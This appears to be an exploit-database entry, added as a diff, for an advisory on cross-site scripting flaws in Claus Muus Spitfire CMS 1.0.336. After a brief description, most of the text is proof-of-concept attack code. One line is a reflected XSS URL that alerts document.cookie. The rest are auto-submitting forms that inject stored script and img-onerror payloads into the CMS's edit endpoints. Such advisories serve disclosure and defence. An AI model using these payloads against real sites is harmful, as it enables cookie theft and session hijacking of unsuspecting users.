@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/41885/info
+
+Claus Muus Spitfire is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Claus Muus Spitfire 1.0.336 is vulnerable; prior versions may also be affected. 
+
+http://www.example.com/site/cont_index.php?cms_id=PAGE_ID"><script>alert(document.cookie)</script> 
+
+<form action="http://www.example.com/cms//edit/tpl_element_settings_action.php" method="post" name="main" > <input type="hidden" name="action" value="save" /> <input type="hidden" name="value[description]" value='descr2"><script>alert(document.cookie)</script>' /> </form> <script> document.main.submit(); </script> 
+
+<form action="http://www.example.com/cms//edit/tpl_edit_action.php" method="post" name="main" > <input type="hidden" name="action" value="save" /> <input type="hidden" name="value[headline]" value='headl2<img src=x onerror=alert(234)>' /> <input type="hidden" name="winid" value="0" /> </form> <script> document.main.submit(); </script> Second code: <form action="http://www.example.com/cms//edit/tpl_edit_action.php" method="post" name="main" > <input type="hidden" name="action" value="value" /> <input type="hidden" name="tabid" value="headline" /> <input type="hidden" name="winid" value="0" /> </form> <script> document.main.submit(); </script> 
+
+<form action="http://www.example.com/cms/edit/tpl_backup_action.php" method="post" name="main" > <input type="hidden" name="action" value="message" /> <input type="hidden" name="text" value='help text<img src=x onerror=alert(document.cookie)>' /> </form> <script> document.main.submit(); </script> 
